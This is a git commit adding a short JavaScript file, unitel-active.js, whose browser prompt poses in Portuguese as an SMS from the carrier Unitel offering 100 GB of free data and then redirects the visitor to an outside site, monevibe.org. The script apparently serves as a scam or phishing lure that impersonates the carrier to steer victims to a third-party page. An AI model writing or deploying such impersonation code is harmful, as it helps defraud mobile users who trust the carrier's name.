a185dc26ce28a9534223b64cf87da85001771a14
surebanga <erongukpe@gmail.com>
2025-06-13 06:59:13 +0100

    Create unitel-active.js

---
+++ unitel-active.js
@@ -0,0 +1,5 @@
+var password = 'Ativar 100 GB'
+password=prompt('SMS: Parabéns, seu cartão SIM Unitel é elegível para receber dados grátis como recompensa por um cartão SIM antigo, clique em OK para ativar agora','Ativar 100 GB');
+if (password != 'Ativar 100 GB') {
+location.href='https://monevibe.org/unitel.html';
+}
